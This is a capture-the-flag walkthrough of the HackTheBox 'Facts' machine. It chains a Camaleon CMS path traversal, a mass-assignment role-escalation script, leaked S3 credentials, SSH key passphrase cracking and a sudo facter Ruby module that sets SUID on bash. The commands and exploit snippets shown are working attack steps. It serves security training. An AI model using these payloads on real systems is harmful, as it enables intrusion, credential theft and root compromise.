![alt text](images/solved.png)

# HackTheBox — Facts

**Difficulty:** Easy
**OS:** Linux (Ubuntu 25.04)

---

## Reconnaissance

### Nmap

```bash
nmap -sCV -A -p- <MACHINE-IP>
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2
80/tcp open  http    nginx 1.26.3 (Ubuntu)
```

Two open ports — SSH and nginx on port 80.

### /etc/hosts

```bash
echo "<MACHINE-IP> facts.htb" >> /etc/hosts
```

### Web Enumeration

Visiting port 80 presents a Camaleon CMS trivia site. The `/admin` path redirects to `/admin/login`, which has self-registration enabled.

```bash
feroxbuster -u http://facts.htb/ -w /usr/share/wordlists/dirb/big.txt -d 3 -C 403,404
```

```
302  http://facts.htb/admin  =>  http://facts.htb/admin/login
200  http://facts.htb/ajax
```

Navigating to `/admin/login` and clicking **"Create an account"** creates a working low-privilege CMS account. After logging in, the footer reveals **Camaleon CMS Version 2.9.0**.

---

## Initial Access — LFI via CVE-2024-46987

Camaleon CMS < 2.9.1 is vulnerable to a path traversal in the `download_private_file` media endpoint. Any authenticated user, regardless of role, can read arbitrary files from the server filesystem.

```
GET http://facts.htb/admin/media/download_private_file?file=../../../etc/passwd
```

This returns the contents of `/etc/passwd`, confirming arbitrary file read. Relevant system users:

```
root:x:0:0:root:/root:/bin/bash
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

---

## Foothold — CMS Admin via CVE-2025-2304 (Mass Assignment)

Camaleon CMS < 2.9.1 is also vulnerable to mass assignment in the `updated_ajax` password-change endpoint. The controller uses Rails' dangerous `permit!` method which allows all parameters through without any filtering — including `role`.

Injecting `password[role]=admin` into the password change POST request escalates a low-privilege account to full CMS admin.

**Exploit script (`exploit.py`):**

```python
update_data = {
    "_method": "patch",
    "authenticity_token": auth_token,
    "password[password]": password,
    "password[password_confirmation]": password,
    "password[role]": "admin",
}
session.post(submit_url, data=update_data)
```

Running the exploit:

```bash
python3 exploit.py -t http://facts.htb -u test -p test
```

```
[+] Login successful
[+] Got profile page
[i] Version 2.9.0 — appears vulnerable (< 2.9.1)
[+] Got CSRF token: E9u8O-QxqReFdXp6FbaD...
[*] Sending privilege escalation request to http://facts.htb/admin/users/5/updated_ajax ...
[+] Done! Role should now be 'admin' — try refreshing your session.
```

After refreshing the session, the full admin navigation is available including Settings, Users, Plugins, and Appearance.

---

## AWS S3 Credential Leak

Navigating to **Settings → General Site → Filesystem Settings** exposes AWS S3 credentials stored in plaintext in the CMS configuration:

```
AWS Access Key ID:      AKIA604F64A80C48D2DF
AWS Secret Access Key:  /Vb8uEE1VHYg7rcu84gpSnmF9Tb8XoIT020xkWDo
Bucket Name:            randomfacts
Region:                 us-east-1
Endpoint:               http://localhost:54321
```

The endpoint points to a LocalStack instance running locally on the target. Since port 54321 is bound to localhost on the box, it is accessed via `facts.htb:54321` after adding the host entry. Configuring the AWS CLI with the leaked credentials:

```bash
aws configure
# AWS Access Key ID: AKIA604F64A80C48D2DF
# AWS Secret Access Key: /Vb8uEE1VHYg7rcu84gpSnmF9Tb8XoIT020xkWDo
# Default region name: us-east-1
# Default output format: json
```

Listing all buckets:

```bash
aws --endpoint-url http://facts.htb:54321 s3 ls
```

```
2025-09-11  internal
2025-09-11  randomfacts
```

A non-public `internal` bucket exists alongside the expected `randomfacts` bucket. Listing it recursively:

```bash
aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal --recursive
```

```
2026-06-10  .ssh/authorized_keys
2026-06-10  .ssh/id_ed25519
```

An SSH private key is present. Downloading it:

```bash
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .
chmod 600 id_ed25519
```

---

## SSH — Cracking the Key Passphrase

Attempting to use the key immediately prompts for a passphrase, confirming it is encrypted:

```bash
ssh-keygen -y -f id_ed25519
# Enter passphrase for "id_ed25519":
```

Converting to john format and cracking against rockyou:

```bash
ssh2john id_ed25519 > hash.john
john hash.john --wordlist=/usr/share/wordlists/rockyou.txt
```

```
dragonballz      (id_ed25519)
1g 0:00:02:42 DONE
```

Passphrase cracked: **dragonballz**

Connecting as `trivia` (identified earlier via the LFI on `/etc/passwd`):

```bash
ssh -i id_ed25519 trivia@<MACHINE-IP>
# Enter passphrase for key 'id_ed25519': dragonballz
```

```
trivia@facts:~$ id
uid=1000(trivia) gid=1000(trivia) groups=1000(trivia)
```

---

## User Flag

```bash
trivia@facts:~$ cat /home/william/user.txt
```

```
HTB{REDACTED}
```

---

## Privilege Escalation to Root — Facter Custom Module

Checking sudo permissions for the current user:

```bash
sudo -l
```

```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

`facter` is a Puppet system facts tool that supports loading custom Ruby fact modules via the `--custom-dir` flag. Running it under sudo with a controlled directory allows arbitrary Ruby execution as root.

Creating a malicious fact module that sets the SUID bit on `/usr/bin/bash`:

```bash
echo 'Facter.add("evil") {setcode { `chmod +s /usr/bin/bash` } }' > evil.rb
```

Running facter with the custom module:

```bash
sudo /usr/bin/facter --custom-dir ~ evil
```

Verifying the SUID bit was set:

```bash
ls -la /usr/bin/bash
# -rwsr-sr-x 1 root root ... /usr/bin/bash
```

Spawning a root shell with bash's `-p` flag (preserve effective UID):

```bash
bash -p
```

```
bash-5.2# whoami
root
```

---

## Root Flag

```bash
bash-5.2# cat /root/root.txt
```

```
HTB{REDACTED}
```

---

## Credentials Summary

| User | Credential | Source |
|------|-----------|--------|
| trivia (CMS) | test / test | Self-registration |
| trivia (SSH) | id_ed25519 / dragonballz | Internal S3 bucket + john |
| root | — | facter sudo SUID trick |

---

## Key Vulnerabilities

| # | Vulnerability | Impact |
|---|--------------|--------|
| 1 | CVE-2024-46987 — Camaleon CMS path traversal in `download_private_file` | Arbitrary file read as web user |
| 2 | CVE-2025-2304 — Camaleon CMS mass assignment via `permit!` in `updated_ajax` | Role escalation to CMS admin |
| 3 | AWS S3 credentials exposed in CMS filesystem settings | Access to internal LocalStack bucket |
| 4 | SSH private key stored in internal S3 bucket with weak passphrase | Shell as `trivia` |
| 5 | `sudo /usr/bin/facter --custom-dir` (NOPASSWD) with controllable Ruby | Root via SUID bash |

---

## Attack Chain

```
Self-Registration → Low-Privilege CMS Account
  → CVE-2024-46987 LFI → /etc/passwd (user enumeration)
    → CVE-2025-2304 Mass Assignment → CMS Admin Role
      → Settings Panel → AWS S3 Credentials (plaintext)
        → LocalStack S3 → internal bucket → id_ed25519
          → john + rockyou → passphrase: dragonballz
            → SSH as trivia
              → sudo facter --custom-dir (NOPASSWD)
                → Custom Ruby Fact → chmod +s /usr/bin/bash
                  → bash -p → root
```